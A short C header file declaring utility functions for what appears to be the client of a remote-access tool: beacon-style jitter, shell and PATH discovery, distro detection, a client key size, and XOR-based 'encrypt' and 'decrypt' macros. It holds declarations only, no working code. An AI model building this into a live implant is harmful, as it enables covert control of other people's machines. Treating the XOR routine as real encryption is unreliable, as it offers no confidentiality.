#pragma once
#include <netdb.h>
#include <stdbool.h>
#include <stdint.h>

#define CLIENT_KEY_SIZE     12
#define ENCODED_BYTE_SIZE   2
#define ENCRYPTED_BYTE_SIZE 1

#define debug(msg, ...)       print_debug(__func__, msg, __VA_ARGS__)
#define debug_dump(msg, size) print_debug_dump(__func__, msg, size)

void print_debug(const char *func, const char *msg, ...);
void print_debug_dump(const char *func, uint8_t *buf, uint16_t size);

bool     resolve(struct addrinfo *info, struct sockaddr *saddr, char *addr, uint16_t port);
uint64_t copy(void *dst, void *src, uint64_t size);
char    *get_distro();
void     jitter();

void     randseed();
uint64_t randint(uint64_t min, uint64_t max);

bool  path_find(char *executable);
char *shell_find();

uint64_t encode(char *s, uint64_t l);
uint64_t decode(char *s, uint64_t l);

uint64_t xorck(char *s, uint64_t l);
#define encrypt(s, l) (xorck(s, l))
#define decrypt(s, l) (xorck(s, l))
